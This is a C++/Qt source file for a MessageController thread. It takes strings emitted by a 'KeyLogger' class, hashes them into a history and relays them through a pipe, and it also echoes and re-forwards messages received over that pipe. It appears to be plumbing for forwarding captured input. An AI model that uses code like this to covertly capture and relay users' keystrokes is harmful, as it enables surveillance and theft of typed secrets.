#include "MessageController.h"
#include <QDebug>
#include "Global.h"
#include <iostream>

MessageController::MessageController(KeyLogger *logger, PipeController *pipe, QObject *parent) :
    QThread(parent)
{
    connect(logger, SIGNAL(command(QString)), this, SLOT(addCommand(QString)));
    connect(pipe, SIGNAL(pipeCommand(QString)), this, SLOT(addRemoteCommand(QString)));

    pipeController = pipe;

    start();
}

void MessageController::terminate()
{
    qDebug() << "MessageController() - Thread stopped.";
    QThread::terminate();
}

void MessageController::addCommand(QString message)
{
    //_msgs << message;
    _history << QCryptographicHash::hash(message.toUtf8(), QCryptographicHash::Sha256);
    if (pipeController)
    {
        PipePackage pkg(PACKAGE_COMMAND_TEST_MESSAGE, message.toUtf8());
        pipeController->send(pkg);
    }
}

void MessageController::addRemoteCommand(QString message)
{
    QByteArray ba = QCryptographicHash::hash(message.toUtf8(), QCryptographicHash::Sha256);
    if (_history.contains(ba))
        return;

    _history << ba;
    std::cout << "Message received: " << message.toUtf8().constData() << "\n";
    if (pipeController)
    {
        PipePackage pkg(PACKAGE_COMMAND_TEST_MESSAGE, message.toUtf8());
        pipeController->send(pkg);
    }
}

void MessageController::run()
{
    qDebug() << "MessageController - thread started...";

    forever
    {
        if (!_msgs.isEmpty())
        {
            QString m = _msgs.takeFirst();
            _history << QCryptographicHash::hash(m.toUtf8(), QCryptographicHash::Sha256);
            if (pipeController)
            {
                //pipeController->send(m);
            }
        }

        msleep(1000);
    }
}
